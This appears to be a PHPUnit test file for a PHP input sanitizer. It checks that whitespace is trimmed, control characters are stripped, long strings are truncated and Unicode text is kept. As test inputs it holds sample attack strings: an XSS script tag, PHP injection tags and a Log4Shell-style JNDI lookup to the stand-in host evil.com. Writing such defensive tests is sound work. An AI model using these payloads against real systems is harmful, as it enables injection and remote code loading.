<?php

declare(strict_types=1);

namespace Tests\Security;

use App\Security\Sanitizer;
use PHPUnit\Framework\TestCase;

final class SanitizerExtendedTest extends TestCase
{
    private Sanitizer $sanitizer;

    protected function setUp(): void
    {
        $this->sanitizer = new Sanitizer();
    }

    public function test_sanitize_string_trims_whitespace(): void
    {
        $result = $this->sanitizer->sanitizeString('  hello world  ');
        
        $this->assertSame('hello world', $result);
    }

    public function test_sanitize_string_removes_script_tags(): void
    {
        $malicious = 'Hello<script>alert("xss")</script>World';
        
        $result = $this->sanitizer->sanitizeString($malicious);
        
        $this->assertStringNotContainsString('script', $result);
        $this->assertStringNotContainsString('alert', $result);
    }

    public function test_sanitize_string_removes_php_tags(): void
    {
        $malicious = 'Hello<?php echo "hack"; ?>World';
        
        $result = $this->sanitizer->sanitizeString($malicious);
        
        $this->assertStringNotContainsString('<?php', $result);
        $this->assertStringNotContainsString('?>', $result);
    }

    public function test_sanitize_string_removes_short_php_tags(): void
    {
        $malicious = 'Hello<? echo "hack"; ?>World';
        
        $result = $this->sanitizer->sanitizeString($malicious);
        
        $this->assertStringNotContainsString('<?', $result);
    }

    public function test_sanitize_string_removes_jndi_payloads(): void
    {
        $malicious = 'Hello${jndi:ldap://evil.com/exploit}World';
        
        $result = $this->sanitizer->sanitizeString($malicious);
        
        $this->assertStringNotContainsString('jndi', strtolower($result));
    }

    public function test_sanitize_string_removes_control_characters(): void
    {
        $malicious = "Hello\x00\x08\x1FWorld";
        
        $result = $this->sanitizer->sanitizeString($malicious);
        
        // Control chars should be removed
        $this->assertSame('HelloWorld', $result);
    }

    public function test_sanitize_string_truncates_long_strings(): void
    {
        $longString = str_repeat('a', 2500);
        
        $result = $this->sanitizer->sanitizeString($longString);
        
        $this->assertLessThanOrEqual(2000, mb_strlen($result));
    }

    public function test_sanitize_string_preserves_accented_characters(): void
    {
        $input = 'Café résumé naïve';
        
        $result = $this->sanitizer->sanitizeString($input);
        
        $this->assertSame('Café résumé naïve', $result);
    }

    public function test_sanitize_string_preserves_numbers_and_punctuation(): void
    {
        $input = "Item #1: 100.50€, OK!";
        
        $result = $this->sanitizer->sanitizeString($input);
        
        // Should contain numbers, punctuation and letters
        $this->assertStringContainsString('100', $result);
        $this->assertStringContainsString('50', $result);
    }

    public function test_sanitize_string_handles_empty_string(): void
    {
        $result = $this->sanitizer->sanitizeString('');
        
        $this->assertSame('', $result);
    }

    public function test_sanitize_string_handles_unicode(): void
    {
        $input = '你好世界 Привет';
        
        $result = $this->sanitizer->sanitizeString($input);
        
        $this->assertStringContainsString('你好世界', $result);
        $this->assertStringContainsString('Привет', $result);
    }
}
